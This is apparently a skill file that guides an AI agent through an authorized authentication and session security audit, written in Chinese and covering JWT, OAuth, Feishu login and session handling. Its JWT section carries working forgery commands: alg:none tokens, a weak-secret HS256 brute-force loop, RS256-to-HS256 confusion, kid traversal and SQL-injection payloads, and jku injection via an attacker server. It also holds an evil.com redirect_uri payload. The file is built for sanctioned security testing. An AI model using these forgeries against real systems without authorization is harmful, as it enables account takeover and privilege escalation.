---
name: auth-session-audit
description: 身份认证与 Session 安全。JWT 破解（alg:none/HS256 弱密钥/kid 注入/iss-aud/jku 注入）、Token 过期与注销、Session 固定、Cookie 属性、飞书 OAuth/扫码登录授权测试。当任务目标是"打登录/认证/令牌"时启用。
---
---
name: auth-session-audit
description: 身份认证与 Session/JWT/Token 安全测试。含 JWT 破解全矩阵、OAuth 授权测试、飞书扫码授权、Session 管理。
---

# auth-session-audit — 认证与 Session 审计

**授权导入（用户明确许可后允许）**：用户可导入有效的 OAuth Token / 飞书登录后的浏览器状态 / Cookie。工具**不破解**飞书扫码、不自动绕过 2FA，仅使用已授权导入的会话继续测试。

**边界**：不做密码爆破、不猜验证码、不发钓鱼链接。

---

## Phase 0 — 授权与凭据整理

```bash
chmod 600 auth/headers_*.txt auth/cookies_*.json
# 各身份必须能拿到 /me 之类"当前身份"接口
curl -sk -H @auth/headers_user.txt "$BASE/api/me"
curl -sk -H @auth/headers_admin.txt "$BASE/api/me"
```

若 token 失效 → 中止并提示用户；**不**尝试密码爆破登录。

---

## Phase 1 — 认证机制识别

### 1.1 Token 类型

```bash
# 从 headers 或响应头提取 token
TOKEN=$(grep -i "authorization" auth/headers_user.txt | awk '{print $2}' | sed 's/^Bearer //I')
echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null  # 若 base64 三段 → JWT
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null  # payload
```

分类：
- JWT：3 段 base64url
- Opaque token：随机字符串 / UUID
- Cookie session：不透明 session id

### 1.2 登录流程

从 `recon/` 找 `/login` `/oauth/*` `/sso/*` `/auth/*`。抓登录表单、redirect 链、返回 header。

### 1.3 会话固定测试

```bash
# 拿一个 cookie，登录前 vs 登录后是否变化
curl -sk -c evidence/http/cookies_before.txt "$BASE/login"
# 用同一 cookie 登录
curl -sk -b evidence/http/cookies_before.txt -c evidence/http/cookies_after.txt -X POST -d "user=u&p=p" "$BASE/login"
diff evidence/http/cookies_before.txt evidence/http/cookies_after.txt | grep -v "^---"
```

**判定**：session id 在登录后未变化 → Session 固定风险。

---

## Phase 2 — JWT 全矩阵

**JWT 结构**：`header.payload.signature`，均 base64url。

### 2.1 解包 & 基线

```bash
TOKEN="<jwt>"
echo "$TOKEN" | awk -F. '{print $1}' | base64 -d 2>/dev/null | jq .
echo "$TOKEN" | awk -F. '{print $2}' | base64 -d 2>/dev/null | jq .
echo "$TOKEN" | awk -F. '{print $3}'
```

记录 header 的 `alg`、`kid`、`typ`、`jku`、`jks`、`x5u` 等；记录 payload 的 `sub`、`iss`、`aud`、`exp`、`iat`、`nbf`、`scope`、`roles`。

### 2.2 alg: none（算法混淆）

**原理**：某些解析库（旧版本）不强制签名，可伪造 `alg: none`。

```bash
# 构造无签名 token
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
PAYLOAD=$(echo -n '{"sub":1,"role":"admin","iss":"<from orig>","aud":"<from orig>","exp":9999999999}' | base64 | tr -d '=' | tr '/+' '_-')
FORGED="$HEADER.$PAYLOAD."
curl -sk -H "Authorization: Bearer $FORGED" "$BASE/api/admin" -o /dev/null -w "%{http_code}\n"
```

也试 `{"alg":"None"}`、`{"alg":"nOnE"}`、`{"alg":"NONE"}`、`{"alg":""}`、空 signature 段。

**判定**：返回 200 → 严重 alg:none 漏洞。**注意**：现代库（PyJWT 2+、jsonwebtoken 9+）默认禁用，命中率低但仍必测。

### 2.3 HS256 弱密钥爆破

```bash
# 尝试常见弱密钥
for secret in secret secretkey 123456 password admin qwerty letmein test test123 changeme admin123 password123 abc123 1234567890 supersecret; do
  SIG=$(python3 -c "
import hmac,hashlib,base64
def b64(x):return base64.urlsafe_b64encode(x).rstrip(b'=').decode()
h='$HEADER'
p='$PAYLOAD'
s='$secret'.encode()
sig=hmac.new(s, f'{h}.{p}'.encode(), hashlib.sha256).digest()
print(b64(sig))
")
  FORGED="$HEADER.$PAYLOAD.$SIG"
  code=$(curl -sk -H "Authorization: Bearer $FORGED" -o /dev/null -w "%{http_code}" "$BASE/api/me")
  [ "$code" = "200" ] && echo "SIGNED OK secret=$secret" && break
done
```

**判定**：找到可用 secret → 严重 JWT 密钥泄露。

### 2.4 RS256 → HS256 混淆（用公钥当 HMAC 密钥）

```bash
# 从 JWKS 或证书拿公钥（ PEM 格式），当 HMAC secret
PUBKEY='-----BEGIN PUBLIC KEY-----...'
SIG=$(python3 -c "
import hmac,hashlib,base64
def b64(x):return base64.urlsafe_b64encode(x).rstrip(b'=').decode()
s='$PUBKEY'
sig=hmac.new(s.encode(), f'$HEADER.$PAYLOAD'.encode(), hashlib.sha256).digest()
print(b64(sig))
")
```

**判定**：200 → RS256→HS256 混淆成功。

### 2.5 kid 注入

```bash
# header 里改 kid
NEW_HEADER=$(echo -n '{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}' | base64 | tr -d '=' | tr '/+' '_-')
# 或 SQL 注入：
NEW_HEADER=$(echo -n '{"alg":"HS256","typ":"JWT","kid":"1\" OR \"1\"=\"1"}' | base64 | tr -d '=' | tr '/+' '_-')
```

- `kid: ../../dev/null` → 用 `/dev/null` 的 HMAC key 签名（全空 key）
- `kid: 1 OR 1=1` → 若 kid 走 SQL，可能读到全库 secret

### 2.6 jku / x5u / jks 注入

```bash
# 让服务器从我控制的地址拉取公钥
NEW_HEADER=$(echo -n '{"alg":"RS256","typ":"JWT","jku":"https://<my-oast-or-http-server>/jwks.json"}' | base64 | tr -d '=' | tr '/+' '_-')
```

- 需 SSRF 或 DNS rebinding 能力。
- 用可控服务器托管我自己生成的 JWKS（私钥在本地）→ 用私钥签 token → 服务器信任 → 伪造身份。

### 2.7 iss / aud / nbf / exp / iat 绕过

- 不校验 `iss` → 伪造 `iss` 通过
- 不校验 `aud` → 用一个服务的 token 打另一个服务（confused deputy）
- 不校验 `nbf` → 用未来时间的 token
- 不校验 `exp` → 长期有效 token（配合"过期 token 是否仍可用"测试）
- 类型绕过：`"sub": 123` → `"sub": "123"` 或数组

### 2.8 时钟偏移容忍

- 拿一个已过期 token（`exp` 在过去），若仍可用 → 服务器容忍过大偏移，配合延迟攻击。

### 2.9 关键字段篡改

```bash
# 改 sub / role / scope / permissions，用原密钥重签（若拿到）
# 若无原密钥 → 转 2.3 弱密钥爆破
```

### 2.10 Token 长度/格式绕过

- URL 编码空格 / 换行绕过：`Authorization: Bearer  \n <jwt>`
- Header 大小写：`Authorization` vs `authorization`（多数库容忍）
- 从 query param 传 token：`?access_token=<jwt>`
- 从 cookie 传 token：某些库自动读取

---

## Phase 3 — Token 生命周期

### 3.1 过期 token

- 修改 payload 的 `exp` 为过去时间，用原 token 的签名（不能重签就跳过）
- 用真实过期 token 请求 → 若仍 200 → 服务器不校验 exp

### 3.2 注销 / refresh token

```bash
# 找 /logout / /revoke / /refresh
curl -sk -X POST -H @auth/headers_user.txt "$BASE/api/logout" -o /dev/null -w "%{http_code}\n"
# 用同一 token 再试 /me
curl -sk -H @auth/headers_user.txt "$BASE/api/me" -o /dev/null -w "%{http_code}\n"
```

**判定**：
- 注销后原 token 仍可用 → 注销失效。
- refresh_token 注销后仍可用 → refresh 未失效。

### 3.3 权限变更后的一致性

- 管理员 A 修改用户 B 的权限/角色
- 用户 B 用**旧 token** 立即访问被撤销的接口
- 若成功 → 权限变更未同步（token 缓存不失效）

---

## Phase 4 — Cookie 安全属性

见 `web-security-audit` Phase 1。这里补充：

- **Path/Domain**：过宽导致子域间共享
- **HttpOnly**：无 → JS 可读（配合 XSS 直接外泄）
- **Secure**：无 → HTTP 明文传输
- **SameSite=Lax/Strict/None**：None 需 Secure；Lax 下 POST 跨站不带 cookie

---

## Phase 5 — OAuth / SSO 授权测试

### 5.1 通用 OAuth 缺陷

- `redirect_uri` 开放重定向：`?redirect_uri=https://evil.com/@<target.com>` 常见绕过
- `state` 参数缺失或可预测 → CSRF 登录
- `nonce` 缺失 → 重放
- `response_type=code` 泄露到 Referer 或日志
- PKCE 未强制（授权码流）

### 5.2 飞书 OAuth/扫码

**授权边界**：
- ✅ 允许：使用用户已授权导入的 access_token 或浏览器状态（如 storage_state）。
- ❌ 禁止：自动破解、暴力扫码、绕过飞书 2FA、伪造 app_id/app_secret。

```bash
# 用飞书导入的 access_token 测试目标后端
curl -sk -H "Authorization: Bearer <feishu_token>" "$BASE/api/me"
```

**测试内容**（授权后）：
- 飞书授权后是否绑定正确内部用户
- 飞书租户边界：不同租户用户是否可通过飞书登录看到同一内部租户
- 授权 scope 是否校验

### 5.3 SAML

- 若使用 SAML：Signature Wrapping、Assertion 篡改、Audience Restriction 缺失。

---

## Phase 6 — Session 管理

- 登录后并发会话：一个设备登出，其他设备是否失效
- 会话超时：长时间不活动，token/cookie 是否失效
- 密码重置：重置链接是否一次性、是否绑定 user id、是否过期

---

## Phase 7 — 密码与验证码（不爆破）

- 观察登录失败响应（是否泄露"用户不存在 vs 密码错误"，做用户枚举）
- 找 `/forgot-password` `/reset`，检查：
  - 是否泄露"该邮箱已注册"
  - 重置 token 是否可预测、是否一次性、是否过期
  - 重置接口是否要求原密码

**不爆破**，只测试响应与流程缺陷。

---

## 完成标准

- [ ] 所有身份（匿名、普通、管理员、他租户）的 `/me` 全部测过
- [ ] JWT header/payload 全解包分析
- [ ] JWT 全矩阵测试：none、HS256 弱密钥、RS256→HS256、kid 注入、jku 注入、iss/aud/nbf/exp 绕过
- [ ] Token 过期 / 注销 / 权限变更后一致性
- [ ] Cookie 属性完整
- [ ] OAuth redirect_uri / state / nonce / PKCE 全部
- [ ] 若使用飞书：授权导入 + 授权后测试完成
- [ ] 每条命中即 report_finding
